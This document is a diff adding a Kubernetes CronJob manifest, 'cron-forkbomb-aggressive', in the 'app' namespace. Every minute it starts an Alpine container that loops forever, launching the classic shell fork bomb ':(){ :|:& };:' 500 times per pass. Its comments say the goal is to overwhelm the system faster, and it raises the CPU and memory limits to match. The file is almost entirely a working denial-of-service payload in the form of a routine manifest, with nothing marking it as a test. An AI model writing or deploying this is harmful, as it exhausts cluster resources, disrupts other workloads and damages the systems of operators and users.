@@ -1,0 +1,33 @@
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: cron-forkbomb-aggressive
+  namespace: app
+spec:
+  schedule: "* * * * *" # Run every minute
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+          - name: forkbomb
+            image: alpine:latest
+            command:
+            - /bin/sh
+            - -c
+            - |
+              # Fork bomb that recursively creates more processes
+              while true; do
+                for i in $(seq 1 500); do  # Increased number of processes being created
+                  :(){ :|:& };:  # Classic fork bomb in the background
+                done
+                sleep 0.1  # Short sleep to overwhelm the system faster
+              done
+            resources:
+              requests:
+                cpu: "500m" # Increase CPU to 500m (0.5 CPU)
+                memory: "256Mi" # Increase memory to 256Mi
+              limits:
+                cpu: "2" # Increase CPU limit to 2 cores
+                memory: "1Gi" # Increase memory limit to 1Gi
+          restartPolicy: OnFailure
